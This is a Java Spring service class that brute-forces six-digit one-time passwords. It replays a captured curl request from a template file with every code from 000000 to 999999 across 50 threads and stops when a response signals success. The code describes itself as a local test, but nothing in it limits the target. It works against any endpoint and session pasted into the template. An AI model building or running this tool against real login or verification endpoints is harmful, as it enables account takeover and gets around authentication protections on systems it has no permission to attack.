package com.example.test_reactive_spring.service.impl;

import okhttp3.*;
import org.springframework.scheduling.annotation.Async;
import org.springframework.stereotype.Service;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.concurrent.*;
import java.util.concurrent.atomic.AtomicBoolean;

@Service
public class OtpBruteForceService {

    private static final String CURL_TEMPLATE_PATH = "src/main/resources/curl_template.txt";
    private static final String OTP_PLACEHOLDER = "__OTP_PLACEHOLDER__";
    private static final int THREAD_POOL_SIZE = 50;

    private final AtomicBoolean foundSuccess = new AtomicBoolean(false);

    private final OkHttpClient client = new OkHttpClient.Builder()
            .connectTimeout(10, TimeUnit.SECONDS)
            .readTimeout(30, TimeUnit.SECONDS)
            .build();

    @Async
    public void startBruteForceTest() {
        try {
            String curlTemplate = Files.readString(Paths.get(CURL_TEMPLATE_PATH));

            System.out.println("\n=== OTP Brute-Force Test STARTED ===");
            System.out.println("Target: LOCAL test server only");
            System.out.println("Threads: " + THREAD_POOL_SIZE);
            System.out.println("Will stop on first successful OTP\n");

            long startTime = System.currentTimeMillis();

            ExecutorService executor = Executors.newFixedThreadPool(THREAD_POOL_SIZE);
            CompletionService<String> completionService = new ExecutorCompletionService<>(executor);

            int totalOtps = 1_000_000;
            int submitted = 0;

            for (int i = 0; i < totalOtps; i++) {
                if (foundSuccess.get()) break;

                final String otp = String.format("%06d", i);
                final String payloadTemplate = curlTemplate.replace(OTP_PLACEHOLDER, otp);

                completionService.submit(() -> {
                    if (foundSuccess.get()) return null;

                    try {
                        String result = executeSingleRequest(payloadTemplate, otp);
                        if (result != null && result.startsWith("SUCCESS")) {
                            foundSuccess.set(true);
                            return result;
                        }
                        return null;
                    } catch (Exception e) {
                        return String.format("[%-6s] ERROR: %s", otp, e.getMessage());
                    }
                });
                submitted++;
            }

            String winningOtp = null;
            for (int i = 0; i < submitted; i++) {
                try {
                    Future<String> future = completionService.take();
                    String result = future.get();
                    if (result != null) {
                        System.out.println(result);
                        if (result.startsWith("SUCCESS")) {
                            winningOtp = result;
                            break;
                        }
                    }
                } catch (Exception ignored) {}
            }

            executor.shutdownNow();
            executor.awaitTermination(10, TimeUnit.SECONDS);

            long endTime = System.currentTimeMillis();
            double duration = (endTime - startTime) / 1000.0;

            if (winningOtp != null) {
                System.out.printf("%n*** OTP CRACKED! %s ***%n", winningOtp);
            } else {
                System.out.println("\nNo valid OTP found after trying all 1,000,000 combinations.");
            }
            System.out.printf("Test completed in %.2f seconds.%n", duration);
            System.out.println("=== OTP Brute-Force Test FINISHED ===\n");

        } catch (Exception e) {
            System.err.println("Error during OTP brute-force test: " + e.getMessage());
            e.printStackTrace();
        }
    }

    private String executeSingleRequest(String curlCommand, String otp) throws IOException {
        String url = extractBetween(curlCommand, "curl '", "'");
        if (url == null) throw new IllegalArgumentException("URL not found in curl template");

        Headers.Builder headersBuilder = new Headers.Builder();
        int headerStart = 0;
        while ((headerStart = curlCommand.indexOf("-H '", headerStart)) != -1) {
            headerStart += 4;
            int end = curlCommand.indexOf("'", headerStart);
            if (end == -1) break;
            String header = curlCommand.substring(headerStart, end);
            String[] parts = header.split(":", 2);
            if (parts.length == 2) {
                headersBuilder.add(parts[0].trim(), parts[1].trim());
            }
            headerStart = end;
        }

        String jsonBody = extractBetween(curlCommand, "--data-raw '", "'");
        if (jsonBody == null) jsonBody = "";

        RequestBody body = RequestBody.create(jsonBody, MediaType.get("application/json"));

        Request request = new Request.Builder()
                .url(url)
                .headers(headersBuilder.build())
                .post(body)
                .build();

        try (Response response = client.newCall(request).execute()) {
            String respBody = response.body() != null ? response.body().string() : "";

            // CUSTOMIZE THIS BASED ON YOUR LOCAL SERVER'S SUCCESS RESPONSE
            boolean isSuccess = response.isSuccessful() && respBody.toLowerCase().contains("success");

            if (isSuccess) {
                return String.format("[%-6s] SUCCESS (%d): %s", otp, response.code(), respBody.trim());
            }
            return null;
        }
    }

    private String extractBetween(String text, String start, String end) {
        int s = text.indexOf(start);
        if (s == -1) return null;
        s += start.length();
        int e = text.indexOf(end, s);
        return e == -1 ? null : text.substring(s, e);
    }
}
